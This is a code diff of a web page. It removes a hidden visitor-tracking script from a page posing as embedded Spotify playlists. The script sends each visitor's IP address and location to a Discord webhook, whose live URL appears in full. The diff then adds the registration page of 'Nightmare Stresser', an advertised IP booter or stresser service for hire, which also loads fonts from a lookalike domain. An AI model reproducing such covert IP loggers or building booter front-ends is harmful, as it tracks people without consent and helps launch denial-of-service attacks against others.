@@ -1,41 +1,335 @@
+
+<html lang="en" class="no-focus"><!--<![endif]-->
+<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+        <title>Nightmare Stresser | Register </title>
+
+<meta name="description" content="Nightmare Stresser Register Page, Please Register">
+<meta name="keywords" content="stresser, booter, stress test, ip booter, ip stresser, best stresser, web stresser, free stresser, best booter, free booter , best stresser">
+<link rel="canonical" href="https://NightmareStresser.net/">	
+<meta name="audience" content="all">	
+<meta name="author" content="Nightmare Stresser">	
+<meta property="og:type" content="website">
+<meta property="og:locale" content="en_US">	
+<meta property="og:description" content="NightmareStresser Best IP Booter / IP Stresser 2021">
+<meta property="og:site_name" content="NightmareStresser.net">
+<meta property="og:url" content="https://NightmareStresser.net/">
+<meta property="og:title" content="NightmareStresser Best IP Booter / IP Stresser 2021">	
+<meta name="twitter:site" content="NightmareStresser.net">
+<meta name="twitter:title" content="NightmareStresser Best IP Booter / IP Stresser 2021">
+<meta name="twitter:domain" content="NightmareStresser.net">	
+<meta name="twitter:description" content="NightmareStresser Best IP Booter / IP Stresser 2021">
+
+
+        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+        <link rel="stylesheet" href="https://fonts.googleapis.to/css?family=Muli:300,400,400i,600,700">
+        <link rel="stylesheet" id="css-main" href="assets/css/dark.css">
+	    <link rel="stylesheet" id="css-main" href="assets/css/animations.css">
+	    <link href="assets/toastr/toastr.min.css" rel="stylesheet" type="text/css" />
+		 <link href="assets/dist/jquery.bootstrap-touchspin.min.css" rel="stylesheet" />
 <script>
-function monke(json) 
+    var answer="";
+</script>
+	
+		</head>
+<body><div id="page-container" class="main-content-boxed">
+<main id="main-container"><div style="background-image: url('bg.jpg'); background-size: 100% 100%; background-repeat: no-repeat;">
+<div class="hero-static content content-full invisible" style="background-color: rgba(29, 29, 29, 0.86)!important;" data-toggle="appear">
+<div class="py-30 px-5 text-center">
+<a class="link-effect font-w700" href="index.php">
+                <i class="fa fa-user-plus fa-2x"></i>
+                <span class="font-size-xl text-white"> Nightmare</span><span class="font-size-xl"> Stresser</span>
+            </a>
+<h2 class="h4 font-w400 text-muted mb-0">Please Register Below.</h2>
+</div>
+
+
+<div class="row justify-content-center px-5">
+
+<div class="col-sm-8 col-md-6 col-lg-4">
+<div id="alert" style="display:none"></div>
+<div id="loader" style="display:none"></div>
+<div class="form-group row">
+<div class="col-12">
+<div class="form-material">
+<input type="text" id="username" class="form-control" placeholder="Username">
+<label for="login-username">Username</label>
+</div>
+</div>
+</div>
+<div class="form-group row">
+<div class="col-12">
+<div class="form-material">
+<input type="text" id="email" class="form-control" placeholder="Email">
+<label for="login-username">Email</label>
+</div>
+</div>
+</div>
+<div class="form-group row">
+<div class="col-12">
+<div class="form-material">
+ <input type="password" id="password" class="form-control" placeholder="Password">
+<label for="login-password">Password</label>
+</div>
+</div>
+</div>
+
+
+
+
+<div class="form-group row">
+<div class="col-12">
+<div class="form-material">
+ <input type="password" id="rpassword" class="form-control" placeholder="Verify Password">
+<label for="login-username">Verify Password</label>
+</div>
+</div>
+</div>
+
+
+
+<div class="form-group row">
+<div class="col-6">
+<div class="form-material">
+<input type="text" id="captcha_answer" class="form-control" placeholder="Captcha"  onkeydown="if (event.keyCode == 13) document.getElementById('login').click()">
+<label for="login-captcha">Captcha</label>
+</div>
+</div>
+
+<div class="col-6">
+<div class="form-material">
+<img id="captcha" src="turtles/smackyobitch.php">
+<label for="login-captcha"></label>
+</div>
+</div>
+
+</div>
+
+
+<div class="form-group row gutters-tiny">
+<div class="col-12 mb-10">
+<div id="hidebtn" >
+
+  <button class="btn btn-block btn-hero btn-noborder btn-rounded btn-primary" onclick="register()"><i class="fa fa-user-plus"></i> Create Account</button>
+
+</div>
+</div>
+<div class="col-sm-12 text-center">
+                                Already have an account? <a href="https://NightmareStresser.net/source/login.php" class="text-info m-l-5"><b>Login Here!</b></a>
+                            </div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</main>
+</div>
+<script>
+function ReloadCaptcha()
 {
-     var request = new XMLHttpRequest();
-     
-     request.open("POST", "https://discord.com/api/webhooks/996640689200840754/8fdw_c29V5X9oXd4lRT85veF4TLYB0Fb2ClM6H_ch9y2BJXGxDC2HxZdiMUReVWGjJl4");
+    var q = document.getElementById("captcha");
+    if(q)
+    {
+        var w = new Image;
+        w.onload = function() {
+            q.src = this.src;
+            var ca = document.getElementById("captcha_answer");
+        if(ca)
+            ca.value = "";
+        }
+        w.src = "turtles/smackyobitch.php" + "?smackin=" + new Date().getTime();
+    }
+}
+function register()
+{
+var username=$('#username').val();
+var email=$('#email').val();
+var password=$('#password').val();
+var rpassword=$('#rpassword').val();
+var captcha_answer=$('#captcha_answer').val();
 
-     request.setRequestHeader('Content-type', 'application/json');
-
-     var params = 
-     {
-          username: "IP Logger",
-          avatar_url: "",
-          content: "@everyone",
-          embeds: [
-               {
-                    title: "Someone visited the IP grabber!",
-                    color: 1752220,
-                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
-               }
-          ]
-     }
-
-     request.send(JSON.stringify(params));
+document.getElementById("alert").style.display="none";
+document.getElementById("loader").style.display="inline"; 
+var xmlhttp;
+if (window.XMLHttpRequest)
+  {
+  xmlhttp=new XMLHttpRequest();
+  }
+else
+  {
+  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  }
+xmlhttp.onreadystatechange=function()
+  {
+  if (xmlhttp.readyState==4 && xmlhttp.status==200)
+    {
+		ReloadCaptcha();
+	    document.getElementById("alert").innerHTML=xmlhttp.responseText;
+  document.getElementById("loader").style.display="none";
+  document.getElementById("alert").style.display="inline";
+  if (xmlhttp.responseText.search("Redirecting") != -1)
+  {
+  	window.location="index.php";
+    }
+    }
+  }
+xmlhttp.open("POST","ripx/login.php?type=register",true);
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+xmlhttp.send("username=" + username + "&email=" + email + "&password=" + password + "&rpassword=" + rpassword + "&captcha_answer=" + captcha_answer);
 }
 </script>
-<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
+<script src="assets/js/codebase.min.js"></script>
+<script src="assets/js/plugins/jquery-validation/jquery.validate.min.js"></script>
+<script src="assets/js/pages/login.js"></script>
+   <script src="assets/toastr/toastr.min.js"></script>
+		 <script type="text/javascript">
+            $(function () {
+                var i = -1;
+                var toastCount = 0;
+                var $toastlast;
 
-<!DOCTYPE html>
-<html>
-     <head> Embedded Spotify Playlists </head>
-     <body>
-<h1> Playlist #1 </h1>
-<iframe style="border-radius:12px" src="https://open.spotify.com/embed/playlist/5B3KOMovfQquHG0d3Sx990?utm_source=generator" width="100%" height="380" frameBorder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture"></iframe>
-<h1> Playlist #2 </h1>
-<iframe style="border-radius:12px" src="https://open.spotify.com/embed/playlist/3GnHscQD3TuXyZVXqBukYQ?utm_source=generator" width="100%" height="380" frameBorder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture"></iframe>
-<h1> Playlist #3 </h1>
-<iframe style="border-radius:12px" src="https://open.spotify.com/embed/playlist/2Q6nEHxCjyZ8clOMNI9c86?utm_source=generator" width="100%" height="380" frameBorder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture"></iframe>
+                var getMessage = function () {
+                    var msgs = ['My name is Inigo Montoya. You killed my father. Prepare to die!',
+                        'Are you the six fingered man?',
+                        'Inconceivable!',
+                        'I do not think that means what you think it means.',
+                        'Have fun storming the castle!'
+                    ];
+                    i++;
+                    if (i === msgs.length) {
+                        i = 0;
+                    }
 
-     </body>
-</html>
+                    return msgs[i];
+                };
+
+                var getMessageWithClearButton = function (msg) {
+                    msg = msg ? msg : 'Clear itself?';
+                    msg += '<br /><br /><button type="button" class="btn btn-default clear">Yes</button>';
+                    return msg;
+                };
+
+                $('#showtoast').click(function () {
+                    var shortCutFunction = $("#toastTypeGroup input:radio:checked").val();
+                    var msg = $('#message1').val();
+                    var title = $('#title').val() || '';
+                    var $showDuration = $('#showDuration');
+                    var $hideDuration = $('#hideDuration');
+                    var $timeOut = $('#timeOut');
+                    var $extendedTimeOut = $('#extendedTimeOut');
+                    var $showEasing = $('#showEasing');
+                    var $hideEasing = $('#hideEasing');
+                    var $showMethod = $('#showMethod');
+                    var $hideMethod = $('#hideMethod');
+                    var toastIndex = toastCount++;
+                    var addClear = $('#addClear').prop('checked');
+
+                    toastr.options = {
+                        closeButton: $('#closeButton').prop('checked'),
+                        debug: $('#debugInfo').prop('checked'),
+                        newestOnTop: $('#newestOnTop').prop('checked'),
+                        progressBar: $('#progressBar').prop('checked'),
+                        positionClass: $('#positionGroup input:radio:checked').val() || 'toast-top-right',
+                        preventDuplicates: $('#preventDuplicates').prop('checked'),
+                        onclick: null
+                    };
+
+                    if ($('#addBehaviorOnToastClick').prop('checked')) {
+                        toastr.options.onclick = function () {
+                            alert('You can perform some custom action after a toast goes away');
+                        };
+                    }
+
+                    if ($showDuration.val().length) {
+                        toastr.options.showDuration = $showDuration.val();
+                    }
+
+                    if ($hideDuration.val().length) {
+                        toastr.options.hideDuration = $hideDuration.val();
+                    }
+
+                    if ($timeOut.val().length) {
+                        toastr.options.timeOut = addClear ? 0 : $timeOut.val();
+                    }
+
+                    if ($extendedTimeOut.val().length) {
+                        toastr.options.extendedTimeOut = addClear ? 0 : $extendedTimeOut.val();
+                    }
+
+                    if ($showEasing.val().length) {
+                        toastr.options.showEasing = $showEasing.val();
+                    }
+
+                    if ($hideEasing.val().length) {
+                        toastr.options.hideEasing = $hideEasing.val();
+                    }
+
+                    if ($showMethod.val().length) {
+                        toastr.options.showMethod = $showMethod.val();
+                    }
+
+                    if ($hideMethod.val().length) {
+                        toastr.options.hideMethod = $hideMethod.val();
+                    }
+
+                    if (addClear) {
+                        msg = getMessageWithClearButton(msg);
+                        toastr.options.tapToDismiss = false;
+                    }
+                    if (!msg) {
+                        msg = getMessage();
+                    }
+
+                    $('#toastrOptions').text('Command: toastr["'
+                            + shortCutFunction
+                            + '"]("'
+                            + msg
+                            + (title ? '", "' + title : '')
+                            + '")\n\ntoastr.options = '
+                            + JSON.stringify(toastr.options, null, 2)
+                    );
+
+                    var $toast = toastr[shortCutFunction](msg, title); // Wire up an event handler to a button in the toast, if it exists
+                    $toastlast = $toast;
+
+                    if (typeof $toast === 'undefined') {
+                        return;
+                    }
+
+                    if ($toast.find('#okBtn').length) {
+                        $toast.delegate('#okBtn', 'click', function () {
+                            alert('you clicked me. i was toast #' + toastIndex + '. goodbye!');
+                            $toast.remove();
+                        });
+                    }
+                    if ($toast.find('#surpriseBtn').length) {
+                        $toast.delegate('#surpriseBtn', 'click', function () {
+                            alert('Surprise! you clicked me. i was toast #' + toastIndex + '. You could perform an action here.');
+                        });
+                    }
+                    if ($toast.find('.clear').length) {
+                        $toast.delegate('.clear', 'click', function () {
+                            toastr.clear($toast, {force: true});
+                        });
+                    }
+                });
+
+                function getLastToast() {
+                    return $toastlast;
+                }
+
+                $('#clearlasttoast').click(function () {
+                    toastr.clear(getLastToast());
+                });
+                $('#cleartoasts').click(function () {
+                    toastr.clear();
+                });
+            })
+        </script>
+</body></html>
